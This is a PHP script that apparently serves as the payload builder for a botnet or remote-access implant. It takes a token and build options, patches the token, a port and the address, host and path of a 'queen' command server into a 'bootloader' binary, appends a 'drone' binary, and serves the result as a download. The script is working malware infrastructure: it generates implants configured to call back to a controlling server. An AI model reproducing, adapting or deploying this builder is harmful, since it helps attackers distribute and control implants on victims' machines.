<?php









ini_set('display_errors',0);

include "./include/config.inc.php";

$token = $_GET['token'];
$ssl  = intval($_GET['ssl']);
$bit  = intval($_GET['bit']);

$lasterror = false;

$loader_filename = false;
$drone_filename  = false;

if (!preg_match('/^[a-zA-Z0-9]{32}$/',$token)){
    $lasterror[] = 'illegal token';
}
$loader_filename  = "bootloader";
$configure_offset = 0;
$srv_port = 443;
switch ($ssl){
    case 0:
   	    $drone_filename  = "drone.nossl";
	    $srv_port = 80;
	    break;
    case 1:
   	    $drone_filename  = "drone.openssl.10";
	    break;
    case 2:
		$drone_filename  = "drone.openssl.1.0.0";
	    break;
    default:
		$lasterror[] = 'illegal value of ssl';
		break;
}

if ((1 != $bit) and (2 != $bit)){
    $lasterror[] = 'illegal value of bit';
}

if (1 == $bit){
    $configure_offset = 4544;
}else{
    $configure_offset = 5792;
}

if (!$lasterror){
    $base_path = $repo_path."bin/";
    $loader_filename = $base_path.$loader_filename.'.'.$bit;
    $drone_filename  = $base_path.$drone_filename.'.'.$bit;

	$loader_filesize = filesize ($loader_filename);
	$drone_filesize  = filesize ($drone_filename);

	if (($loader_filesize) and ($drone_filesize)){
        $total_size = $loader_filesize + $drone_filesize;
		$my_configure  = $token;
        $my_configure .= pack("S",$srv_port);

        $queen_srv_ini_len = 34 + 3 + strlen($queen_srv_ini['addr']) + strlen($queen_srv_ini['host']) + strlen($queen_srv_ini['path']);
		if ($queen_srv_ini_len > $queen_srv_ini['buff']){
		    $lasterror[] = "srv ini over max buff";    
		}else{	
			header("Content-type:application/binary");
			header('Content-Length: '.$total_size);
			header('Content-Disposition: attachment; filename="drone"');
			$buf = file_get_contents($loader_filename);
			$tmp = substr($buf,0,$configure_offset);
			echo "$tmp";
			echo "$my_configure";
			echo $queen_srv_ini['addr'];
			echo "\x00";
			echo $queen_srv_ini['host'];
			echo "\x00";
			echo $queen_srv_ini['path'];
			echo "\x00";
			

			$tmp = substr($buf,$configure_offset+$queen_srv_ini_len);        
			echo "$tmp";
			$buf = file_get_contents($drone_filename);	
			echo "$buf";
		}
	}else{
	    $lasterror[] = 'fail get drone filesize';
	}
}

if ($lasterror){
    foreach ($lasterror as $a){
	    echo "$a<br>";
	}
}

exit;

?>